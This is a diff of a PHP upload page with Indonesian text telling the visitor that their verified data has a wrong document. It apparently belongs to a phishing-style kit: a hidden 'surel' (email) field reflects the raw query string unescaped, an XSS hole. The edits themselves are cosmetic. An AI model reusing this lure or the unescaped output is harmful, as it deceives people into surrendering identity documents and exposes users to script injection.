@@ -35,7 +35,7 @@
 		<div class="row">
 			<div class="col-sm-12">
 
-			<i class="fa fa-angle-right" aria-hidden="true"></i> UPLOAD IMAGE: <?php echo $voc; ?>
+			<i class="fa fa-angle-right" aria-hidden="true"></i> UPLOAD : <?php echo $voc;?>
 <input type="hidden" id="surel" name="surel" value="<?php echo $_SERVER['QUERY_STRING'];?>" />
 			</div>
 		</div>
@@ -51,8 +51,8 @@
 		<div class="col-sm-6">
 
 
-			<p>Data Anda Sudah Kami periksa dan sudah kami verifikasi, Tetapi Document Anda Salah.</p>
-                      
+			<p>Data Anda Sudah Kami periksa dan sudah kami verifikasi, Tetapi Document Anda Salah2.</p>
+
 			<form method="POST" id="contact" name="13" class="form-horizontal wpc_contact" novalidate="novalidate" enctype="multipart/form-data">
 
 			<div class="panel panel-default">
@@ -60,9 +60,7 @@
 					 <label>Upload Image</label>
 				</div>
 				<div class="panel-body">
-				voc
-
-					<div class="input-group">
+				<div class="input-group">
 						<form method="POST" id="contact" name="13" class="form-horizontal wpc_contact" novalidate="novalidate" enctype="multipart/form-data">
 
 						<span class="input-group-btn">
@@ -75,7 +73,7 @@
 					</div>
 
 					<img id='img-upload'/>
-
+</br>
                                <button class="btn btn-success">Upload</button>
 					  <div class="form-group">
 
@@ -86,6 +84,9 @@
     <div class="col-sm-3">
 
 		</div>
+            <div class="col-sm-3">
+
+	  </div>
 	</div>
 </div>
 
